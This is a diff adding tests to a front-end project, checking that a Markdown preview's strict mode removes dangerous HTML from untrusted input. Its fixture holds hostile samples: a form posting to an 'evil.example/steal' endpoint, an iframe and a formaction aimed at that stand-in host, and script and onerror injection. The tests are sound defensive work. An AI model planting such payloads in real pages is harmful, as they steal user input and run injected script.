@@ -80,3 +80,31 @@ describe('text size', () => {
     expect(smaller.disabled).toBe(true)
   })
 })
+
+describe('strict rendering of untrusted Markdown', () => {
+  const HOSTILE = [
+    '# Title', '',
+    '<form action="https://evil.example/steal" method="post"><input name="x"><button type="submit">Go</button></form>', '',
+    '<textarea>t</textarea><select><option>o</option></select><iframe src="https://evil.example"></iframe>', '',
+    '<a href="https://ok.example" formaction="https://evil.example">link</a>', '',
+    '<script>window.hacked = 1</script><img src="x" onerror="window.hacked = 2">', '',
+  ].join('\n')
+  const html = strict => {
+    const { container } = render(<MarkdownPreview markdown={HOSTILE} strict={strict} />)
+    return container.querySelector('.md-content')
+  }
+
+  it('drops forms, inputs, buttons, textareas, selects and frames, and the attributes that submit', () => {
+    const el = html(true)
+    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'iframe', 'script']) expect(el.querySelector(tag)).toBeNull()
+    expect(el.querySelector('[action], [formaction], [onerror]')).toBeNull()
+    expect(el.querySelector('h1').textContent).toBe('Title')
+    expect(el.querySelector('a').getAttribute('href')).toBe('https://ok.example')
+  })
+
+  it('still strips scripts and event handlers without it, as before', () => {
+    const el = html(false)
+    expect(el.querySelector('script')).toBeNull()
+    expect(el.querySelector('[onerror]')).toBeNull()
+  })
+})
